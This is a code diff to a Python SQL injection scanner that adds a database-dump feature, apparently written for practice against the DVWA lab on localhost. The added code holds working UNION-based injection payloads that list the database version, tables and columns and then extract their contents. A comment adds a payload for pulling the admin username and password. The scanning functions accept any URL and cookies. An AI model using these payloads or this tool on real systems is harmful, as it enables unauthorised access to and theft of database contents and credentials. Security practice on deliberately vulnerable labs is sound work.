@@ -34,10 +34,14 @@ def parse_data(string):
 def get_all_forms(url):
     """Returns all forms from the HTML content of a url"""
     try:
-        soup = bs(s.get(url).content, "html.parser")
+        res = s.get(url)
     except Exception as e:
         print(e)
         quit()
+    if (res.status_code == 404):
+        print("Error 404: incorrect url or whatever")
+        quit()
+    soup = bs(res.content, "html.parser")
     return soup.find_all("form")
 
 def get_form_details(form):
@@ -103,10 +107,11 @@ def check_form(url):
                 res = s.post(url, data=data)
             elif form_details["method"] == "get":
                 res = s.get(url, params=data)
+            print(data)
             # Check response
             if is_vulnerable(res):
                 vulnerable = True
-                print("\nSQL Injection vulnerability detected in:\n\t", res.url)
+                print("\nSQL Injection vulnerability detected in:\n\t", url)
                 print("data:")
                 pprint(data)
     if not vulnerable:
@@ -116,9 +121,9 @@ def check_url(url, data, method):
     if data == None:
         print("No data to process. Use '--data' argument")
         quit()
-    for c in "\"'":
-        for k in data:
-            data[k] = f"test{c}"
+    for k in data:
+        value = data[k]
+        data[k] = f"test'"
         try:
             if method == "GET":
                 res = s.get(url, params=data)
@@ -127,10 +132,102 @@ def check_url(url, data, method):
         except Exception as e:
             print(e)
             quit()
+        if (res.status_code == 404):
+            print("Error 404: incorrect url or whatever")
+            quit()
         if is_vulnerable(res):
-            print("url vulnerable")
+            print(f"[X] data-name '{k}' might be vulnerable")
         else:
-            print("url not vulnerable")
+            print(f"[-] data-name '{k}' is not vulnerable")
+        data[k] = value
+
+'''
+https://portswigger.net/web-security/sql-injection/examining-the-database
+' UNION SELECT NULL, @@version; -- 
+' UNION SELECT table_catalog,table_name FROM information_schema.tables; -- 
+' UNION SELECT table_name,column_name FROM information_schema.columns; -- 
+
+
+2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||','||username||','||password FROM users WHERE username='admin')
+'''
+
+def download_info(url="http://localhost/vulnerabilities/sqli/"):
+    '''Only work with 'dvwa': http://localhost/vulnerabilities/sqli/
+    Output is like:
+    <pre>ID: value <br/>First name: def<br/>Surname: INNODB_LOCKS</pre>
+    '''
+    i_version = "' UNION SELECT NULL, @@version; -- "
+    i_tables = "' UNION SELECT table_catalog,table_name FROM information_schema.tables; -- "
+    i_columns = "' UNION SELECT table_name,column_name FROM information_schema.columns; -- "
+    len_sep = len("Surname: ")
+    info = {}
+    try:
+        # Get user token
+        forms = get_all_forms(url)
+        details = get_form_details(forms[0])
+        for input_tag in details["inputs"]:
+            if input_tag["name"] == "user_token":
+                token = input_tag["value"]
+
+        data = {"id": i_version, "Submit": "Submit", "user_token": token}
+        res = s.get(url, params=data)
+        soup = bs(res.content, "html.parser")
+        info["version"] = soup.pre.text[soup.pre.text.find("Surname: ") + len_sep:]
+    except Exception as e:
+        print(e)
+        quit()
+
+    data["id"] = i_tables
+    soup = bs(s.get(url, params=data).content, "html.parser")
+    # Database name
+    start = soup.pre.text.find("First name: ") + len("First name: ")
+    info["database"] = soup.pre.text[start:soup.pre.text.find("Surname", start)]
+    # Table names
+    info["tables"] = []
+    for pre in soup.find_all("pre"):
+        tab = pre.text[pre.text.find("Surname: ") + len_sep:]
+        info["tables"].append(tab)
+
+    # Columns names
+    data["id"] = i_columns
+    soup = bs(s.get(url, params=data).content, "html.parser")
+    info["columns"] = []
+    for pre in soup.find_all("pre"):
+        start = pre.text.find("First name: ") + len("First name: ")
+        col = pre.text[start:]
+        col = col.split("Surname: ")
+        info["columns"].append(col)
+
+    # Dump database
+    info["data"] = []
+    for col in info["columns"]:
+        if col[0].isupper(): # Tables without access
+            break
+        payload = f"' UNION SELECT NULL, {col[1]} FROM {col[0]}; -- "
+        data["id"] = payload
+        soup = bs(s.get(url, params=data).content, "html.parser")
+        for pre in soup.find_all("pre"):
+            entry = []
+            entry.append(col[1])
+            entry.append(pre.text[pre.text.find("Surname: ") + len_sep:])
+            info["data"].append(entry)
+
+    return info
+
+def save_info(info, filename):
+    with open(filename, "w") as f:
+        f.write(f"DATABASE VERSION: {info['version']}\n")
+        f.write(f"DATABASE NAME: {info['database']}\n")
+        f.write("\nTABLES NAMES:\n")
+        for t in info["tables"]:
+            f.write(f"{t}\n")
+        f.write("\nCOLUMNS NAMES:\n")
+        for c in info["columns"]:
+            f.write(f"TABLE: {c[0]:<25} COLUMN: {c[1]}\n")
+        f.write(f"\nDUMP DATA:\n")
+        for d in info["data"]:
+            f.write(f"COLUMN: {d[0]:<20} DATA: {d[1]}\n")
+
 
 def main():
     parser = argparse.ArgumentParser()
@@ -140,11 +237,13 @@ def main():
         help="Type of request, if not specified GET will be used")
     parser.add_argument("url", help="url to scan")
     parser.add_argument("-c", "--cookie", 
-            help="introduce cookies in the form of 'name=value&name=value...'")
+        help="introduce cookies in the form of 'name=value&name=value...'")
     parser.add_argument("-d", "--data",
-            help="introduce data to submit in the form of 'key=value&key=...'")
+        help="introduce data to submit in the form of 'key=value&key=...'")
     parser.add_argument("-f", "--forms", action="store_true",
-            help="look for forms in the url to inject SQL")
+        help="look for forms in the url to inject SQL")
+    parser.add_argument("-u", "--dump", action="store_true",
+        help="dump the info of a database")
     args = parser.parse_args()
 
     if (args.X != "GET" and args.X != "POST"):
@@ -154,7 +253,9 @@ def main():
     if (args.cookie):
         parse_cookies(args.cookie)
 
-    if (args.forms):
+    if (args.dump):
+        save_info(download_info(), args.o)
+    elif (args.forms):
         check_form(args.url)
     else:
         check_url(args.url, parse_data(args.data), args.X)
